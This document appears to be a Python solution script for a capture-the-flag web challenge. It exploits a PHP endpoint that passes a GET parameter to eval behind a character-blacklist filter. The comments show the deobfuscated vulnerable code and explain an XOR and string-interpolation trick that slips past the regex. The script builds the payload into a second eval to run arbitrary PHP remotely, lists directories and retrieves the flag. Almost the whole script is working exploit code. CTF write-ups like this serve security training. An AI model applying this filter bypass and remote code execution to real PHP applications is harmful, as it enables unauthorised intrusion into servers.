import requests
import urllib
import re

base_url = 'https://until-the-end.secchallenge.crysys.hu'


def solve():
    dirlist = scandir('.')
    hidden_folder = re.search('very.*', dirlist).group()
    subfolder = scandir(hidden_folder)
    assert 'flag' in subfolder
    return requests.get(f'{base_url}/{hidden_folder}/flag').text


def scandir(path):
    return rce(f'foreach (scandir("{path}") as $v) echo $v."\n";')


def rce(cmd):

    # The task is built around PHPFuck obfuscation. After we extract the mess, we get:

    # if (isset($_GET[' '])) {
    #   eval(str_replace('a', str_replace('kekw'), str_rot13(strtoupper(substr($_GET[' '], 42, 69)))));
    # }
    # else if (isset($_GET['+'])) {
    #   if (preg_match('/[b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]/', $_GET['+'])) die();
    #   eval($_GET['+']);
    # }
    # else {
    #   die();
    #   shell_exec($_GET['cmd']);
    # }

    # we will exploit the second 'if' case. Let's introduce a new query parameter 'e' which will be
    # executed by our exploit.
    #
    # First build up the string '$_GET["e"]' with the use of string interpolation and XOR operations
    # to trick the regexp filter.

    # Note that 'a'^'$' is just 'E' and '|'^'(' is a funny way to write 'T':
    exploit = '''
        $a='$_G';
        $aa='a'^'$';
        $aaa='|'^'(';
        $aaaa='["e"]';
        $aaaaa="$a$aa$aaa$aaaa";
    '''

    # $aaaaa equals to '$_GET["e"]' now. If we eval it, we get the 'e' query parameter, the second eval in turn runs e as PHP code:
    exploit += f'''
        eval("eval($aaaaa);");
    '''

    exploit = urllib.parse.quote(exploit)

    cmd = 'echo "qqqqq";' + cmd + 'echo "qqqqq";'
    cmd = urllib.parse.quote(cmd)
    response = requests.get(f'{base_url}?e={cmd}&%2b={exploit}')
    return re.search(r'qqqqq(.*)qqqqq', response.text, re.DOTALL).group(1)


if __name__ == "__main__":
    print(solve())
